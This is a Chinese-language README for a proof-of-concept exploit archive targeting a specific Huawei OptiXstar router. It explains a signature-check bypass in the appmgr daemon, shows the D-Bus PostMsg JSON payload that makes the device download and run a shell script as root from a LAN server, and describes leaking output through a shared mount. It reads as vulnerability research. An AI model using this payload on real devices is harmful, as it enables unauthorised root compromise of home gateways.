# 华为 SAF 容器框架与 D-Bus 特权调度 PoC 资产

本目录归档了在华为 OptiXstar HN8145X6N（Dopra Linux R23 SPC162 固件）上验证的应用管理器权限跃迁与受限穿透代码。

---

## 0x01 文件清单
* **`appmgr_dbus_pwn.py`**：完整的跨容器特权跃迁自动化利用脚本。自包含生成 Root 载荷与 D-Bus 触发脚本，通过宿主受限灰度壳（`srv_clid`）向核心守护进程 `/sbin/appmgr` 注入 `PostMsg`，在 `/ipks/` 隧道中以真实 `UID 0 (root)` 权限执行任意载荷并回收回显。
* **`delivery_server_8888.py`**：轻量级局域网文件投递 HTTP 服务器（Port 8888）。为光猫各层组件拉取 Root 脚本或内核驱动提供高可靠分发。
* **`lan_jsonrpc_probe.py`**：局域网 17998/tcp 端口探测脚本。用于测试 SAF CloudClient 协议帧格式与访问控制策略。
* **`poc_root.sh`**：在容器 Root 环境下执行的独立探针示例脚本。

---

## 0x02 漏洞机理与调用链路

### 1. 业务逻辑调度缺陷
华为网关将增值服务（wifiaudit, b01odm, xrobot）封装在 SAF LXC 容器中，由特权进程 `/sbin/appmgr`（UID 0）负责生命周期调度。  
分析 `appmgr` 发现，其在处理特定内部维护通道（如 `opmaintainv3` 组件）的 D-Bus 消息时：
* 只要字段满足 `InPlugin: 1` 且 `RunScript: 1`；
* 调度器将跳过插件数字签名校验机制；
* 直接从传入的 `URL` 参数执行指定脚本，且执行上下文直接继承守护进程的 **`UID 0 (root)`** 完整权限。

### 2. 调用参数结构
```json
{
    "RPCMethod": "PostMsg",
    "AppName": "opmaintainv3",
    "Params": {
        "InPlugin": 1,
        "RunScript": 1,
        "Parameter": {
            "URL": "http://192.168.100.2:8888/run_root.sh",
            "Args": "start"
        }
    }
}
```

### 3. 双向数据交互隧道（Mount Namespace 穿越）
虽然容器与宿主处于不同的 Mount Namespace，但分析 `/proc/mounts` 证实：
* 宿主目录 `/mnt/jffs2/plug/apps/apps/ipks/`
* 被绑定挂载（Bind Mount）至容器内的 `/ipks/`

攻击链利用此共享目录作为穿越隧道：容器内的 Root 脚本将执行回显写入 `/ipks/root_result.txt`，宿主端的低权限调试进程即可在 `/mnt/jffs2/...` 下无缝读取执行结果，实现了完整的受限壳越狱与特权闭环。
